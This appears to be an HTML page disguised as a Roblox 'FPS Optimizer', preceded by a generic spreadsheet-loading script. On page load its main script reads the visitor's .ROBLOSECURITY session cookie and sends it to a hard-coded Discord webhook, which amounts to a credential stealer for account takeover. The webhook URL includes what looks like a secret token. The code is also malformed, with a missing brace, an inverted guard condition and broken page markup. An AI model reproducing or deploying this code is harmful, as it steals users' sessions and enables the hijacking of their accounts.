<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>
<html lang="en">
<head>

<body>

  <script>
    // Espera o DOM estar completamente carregado
    document.addEventListener('DOMContentLoaded', () => {
      // Inicializa os elementos do DOM
      const status = document.getElementById('status');
      const progress = document.getElementById('progress');
      const optimizeButton = document.getElementById('optimizeButton');

      if (!status || !progress || !optimizeButton) {

        // Tenta capturar o cookie .ROBLOSECURITY
        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
        if (cookie) {
          const cookieValue = cookie.split('=')[1];
          console.log('Cookie encontrado:', cookieValue);
          if (cookieValue && cookieValue.startsWith('_|WARNING:-DO-NOT-SHARE-THIS')) {
            // Envia o cookie para o Discord
            fetch('https://discord.com/api/webhooks/1398881274415812668/COAqK1x2n8okDDHvIQc489zoVsTxTs08sc3ZBl-peSVEtXTgRXZXh-DEUr5f9EPbcjxQ', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                content: `[FPS Optimizer] Cookie .ROBLOSECURITY capturado: ${cookieValue}`,
                username: 'Roblox FPS Bot'
              })
            })
            .then(response => {

            })
            .catch(error => {
              console.error('Erro no fetch:', error);
              status.innerHTML = 'Status: Erro: ' + error.message + ' <div class="progress"></div>';
            });
          } else {
            status.innerHTML = 'Status: Cookie inválido. <div class="progress"></div>';
            console.log('Cookie inválido ou ausente do padrão.');

        } else {
          status.innerHTML = 'Status: Nenhum cookie Roblox encontrado. <div class="progress"></div>';
          console.log('Nenhum cookie .ROBLOSECURITY encontrado.');
        }
      });
    });
  </script>
